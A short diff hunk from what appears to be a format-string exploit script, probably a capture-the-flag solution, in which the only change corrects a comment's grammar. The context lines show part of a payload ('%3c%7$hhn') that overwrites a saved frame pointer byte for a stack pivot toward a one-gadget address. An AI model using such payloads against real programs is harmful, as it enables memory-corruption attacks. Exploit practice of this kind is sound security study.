@@ -29,7 +29,7 @@ while True:
     index_old_rbp = 7
     index_ptr_to_libc = 26
 
-    # fprintf write 13 bytes by default ("[USER] name: ")
+    # fprintf writes 13 bytes by default ("[USER] name: ")
     payload = b''
     payload += b'%3c%7$hhn'  # overwrite lsbyte of old old rbp to 0x10 for stack pivot
     # specify the offset between addr one gadget and <_IO_doallocbuf+0> on stack, as width field
